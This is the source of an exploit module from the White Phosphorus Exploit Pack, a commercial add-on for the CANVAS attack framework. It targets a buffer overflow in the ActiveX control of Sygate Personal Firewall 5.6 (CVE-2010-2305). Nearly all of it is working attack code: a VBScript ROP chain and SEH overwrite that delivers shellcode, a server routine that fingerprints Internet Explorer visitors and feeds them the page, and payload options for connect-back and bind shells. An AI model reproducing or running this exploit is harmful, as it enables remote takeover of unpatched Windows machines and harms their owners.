
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


######################################################################################
NAME = "Sygate Personal FW ActiveX"
DESCRIPTION = "Sygate Personal Firewall 5.6 build 2808 ActiveX exploit"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Symantec'
DOCUMENTATION["Date public"] = "2010-06-11"
DOCUMENTATION['CVE Name']="CVE-2010-2305"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-2305'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["References"] = "http://www.corelan.be:8800/index.php/forum/security-advisories/10-050-sygate-personal-firewall-5-6-build-2808-activex/"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['VersionsAffected']='5.6 build 2808'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd.

There is no patch for this issue.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a client-side exploit - so use it via clientd, or send the create file to the target

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Sygate Personal FW ActiveX
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: Bind MOSDEF Shell
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_sygate_pf_56/wp_sygate_pf_56.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True

        
        # Bad Chars: 80-9f (makes for extra fun)
        #self.badstring = "\x00\x09\x0d\x20\xff"
        self.badstring = "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"        
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
       
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makefile(self):
        # Make the exploit file
        
        #Base filedata
        
        filedata="""
        <html>
<object classid='clsid:D59EBAD7-AF87-4A5C-8459-D3F6B918E7C9' id='target' ></object>
"""
        filedata += """<script language="vbscript">"""
                
        #script code
        script = """
seh   = unescape("%13%16%47%06") 	'#ADD ESP,46C # RETN


data = data + String(72, "D") 		    '#Junk
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop
data = data + unescape("%19%16%47%06")	'#Nop

data = data + unescape("%6b%fd%48%06")	
data = data + unescape("%58%13%44%06")	
data = data + unescape("%58%58%58%58")	
data = data + unescape("%58%58%58%58")
data = data + unescape("%58%58%58%58")
data = data + unescape("%58%58%58%58")

data = data + unescape("%58%13%44%06")	

data = data + unescape("%b2%7d%48%06")	
data = data + unescape("%58%58%58%58")
data = data + unescape("%58%58%58%58")
data = data + unescape("%b2%7d%48%06")	
data = data + unescape("%58%58%58%58")

data = data + unescape("%c6%c5%45%06")
data = data + unescape("%0a%11%44%06")
data = data + unescape("%11%16%44%06")


data = data + unescape("%19%35%46%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")

data = data + unescape("%05%67%47%06")

data = data + unescape("%60%f0%ff%ff")

data = data + unescape("%db%fa%47%06")
data = data + unescape("%19%35%46%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")

data = data + unescape("%05%67%47%06")

data = data + unescape("%ff%ef%ff%ff")
data = data + unescape("%db%fa%47%06")
data = data + unescape("%bc%66%44%06")
data = data + unescape("%19%35%46%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")
data = data + unescape("%df%c2%47%06")

data = data + unescape("%05%67%47%06")
data = data + unescape("%c0%ff%ff%ff")
data = data + unescape("%db%fa%47%06")
data = data + unescape("%19%35%46%06")

data = data + unescape("%05%67%47%06")

data = data + unescape("%2b%6b%b5%f9")
data = data + unescape("%db%fa%47%06")
data = data + unescape("%f2%bd%47%06")


data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")

data = data + unescape("%0b%19%44%06")

data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")
data = data + unescape("%7b%b9%48%06")

data = data + unescape("%7A%b9%48%06")
data = data + unescape("%7A%b9%48%06")

sc = unescape("SHELLCODE")

ourlen = 2964 - len(sc)
junk  = String(ourlen, "D") 
mjunk = String(25000, "A")

arg1=1
arg2=1
arg3= data + sc + junk + seh + mjunk
arg4="defaultV"
arg5="defaultV"

target.SetRegString arg1 ,arg2 ,arg3 ,arg4 ,arg5
"""
        script = script.replace('SHELLCODE',urlencode(self.shellcode))
        filedata += script
        
        # Add the reset of the filedata
        filedata += """
</SCRIPT>
</html>
"""
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        
        filedata=self.makefile()
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        ret = self.wp_postExploitShellcode()
        if ret:
           return ret 
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
